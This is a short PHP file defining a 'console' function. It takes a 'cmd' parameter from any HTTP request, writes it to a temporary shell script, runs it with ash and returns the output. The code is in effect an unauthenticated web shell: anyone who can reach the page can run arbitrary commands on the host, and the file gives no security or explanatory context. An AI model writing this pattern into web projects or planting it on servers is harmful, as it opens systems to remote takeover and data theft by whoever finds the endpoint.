<?php 
function console($cmd=null){
	if(isset($_REQUEST['cmd'])&&!empty($_REQUEST['cmd'])){
		$cmd=$_REQUEST['cmd'];
	}
	if($cmd){
		$ex=str_replace("\r","\n",$cmd);
		$rname="/tmp/tmp.". str_pad(mt_rand(1000,9999), 4, "0", STR_PAD_LEFT)  .".sh";
		file_put_contents($rname,"#!/bin/ash\nexport PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'\n$ex\n");
		exec("rm /tmp/console; ash $rname > /tmp/console");
		return nl2br(file_get_contents("/tmp/console"));
	}else{
		return 'Enter comand';
	}
}
?>